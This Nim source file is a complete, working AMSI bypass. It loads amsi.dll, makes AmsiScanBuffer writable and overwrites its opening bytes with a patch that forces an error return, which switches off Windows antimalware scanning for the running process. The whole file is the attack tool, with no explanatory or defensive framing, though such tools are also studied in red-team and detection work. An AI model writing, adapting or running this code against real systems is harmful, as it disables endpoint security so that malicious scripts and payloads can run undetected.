import system
import dynlib
import winim/lean 

# REF: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs 

#[
when defined(amd32):
    echo "x32"
elif defined(amd64):
    echo "x64"
else:
    {.fatal: "This architecture is currently unsupported".}
]#

when defined amd64:
    echo "[+] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[+] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


proc patchMain(): bool = 
    var amsiDLL: LibHandle
    var funcAddr: pointer
    var oldProtect: DWORD
    var oldProtect2: DWORD

    amsiDLL = loadLib("amsi")
    if isNil(amsiDLL):
        echo "[-] Load amsi.dll failed."
        return false

    funcAddr = amsiDLL.symAddr("AmsiScanBuffer")
    if isNil(funcAddr):
        echo "[-] (amsi.dll) find AmsiScanBuffer Addr failed."
        return false

    if VirtualProtect(funcAddr, patch.len, 0x40, addr oldProtect) != 0:
        echo "[+] Patch..."
        copyMem(funcAddr, unsafeAddr patch, patch.len)
        if VirtualProtect(funcAddr, patch.len, oldProtect, addr oldProtect2) == 0:
            echo "[-] (VirtualProtect) RE Failed: ", GetLastError()
            return false
        return true
    else:
        echo "[-] (VirtualProtect) Failed: ", GetLastError()
        return false


when isMainModule:
    let res = patchMain()
    echo "[+] AMSI disable: ", res
